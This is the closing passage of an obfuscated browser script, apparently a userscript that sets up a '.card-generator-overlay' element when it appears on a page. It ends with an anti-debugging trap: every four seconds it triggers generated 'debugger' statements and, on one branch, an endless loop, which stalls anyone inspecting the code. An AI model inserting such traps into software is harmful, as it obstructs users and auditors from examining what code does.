        fn_6_1(p_1);
      } catch (v_1_2) {}
      try {
        fn_16(p_1);
      } catch (v_1_2) {}
      try {
        fn_18(p_1);
      } catch (v_1_2) {}
      try {
        fn_19(p_1);
      } catch (v_1_2) {}
      try {
        fn_20(p_1);
      } catch (v_1_2) {}
      try {
        fn_22(p_1);
      } catch (v_1_2) {}
      try {
        fn_23(p_1);
      } catch (v_1_2) {}
      try {
        fn_26(p_1);
      } catch (v_1_2) {}
      try {
        fn_27(p_1);
      } catch (v_1_2) {}
      try {
        fn_29();
      } catch (v_1_2) {}
      fn_21();
    }
    fn_24();
    const v_17 = {};
    v_17.childList = true, v_17.subtree = true, new MutationObserver(() => {
      const v_1_2 = document.querySelector(".card-generator-overlay");
      v_1_2 && !v_1_2.__akifInited && (v_1_2.__akifInited = true, fn_30(v_1_2));
    }).observe(document.documentElement, v_17), fn_3_1(".card-generator-overlay", fn_30, 30000);
  })();
})();
function fn_1(p_1) {
  function fn_1_1(p_1_1) {
    if (typeof p_1_1 === "string") return function (p_1_2) {}.constructor("while (true) {}").apply("counter");else ('' + p_1_1 / p_1_1)["length"] !== 1 || p_1_1 % 20 === 0 ? function () {
      return true;
    }.constructor("debu" + "gger").call("action") : function () {
      return false;
    }.constructor("debu" + "gger").apply("stateObject");
    fn_1_1(++p_1_1);
  }
  try {
    if (p_1) {
      return fn_1_1;
    } else {
      fn_1_1(0);
    }
  } catch (v_1) {}
}
(function () {
  const fn_1_1 = function () {
    let v_1_1;
    try {
      v_1_1 = Function("return (function() " + "{}.constructor(\"return this\")( )" + ');')();
    } catch (v_1_2) {
      v_1_1 = window;
    }
    return v_1_1;
  };
  const v_1 = fn_1_1();
  v_1.setInterval(fn_1, 4000);
})();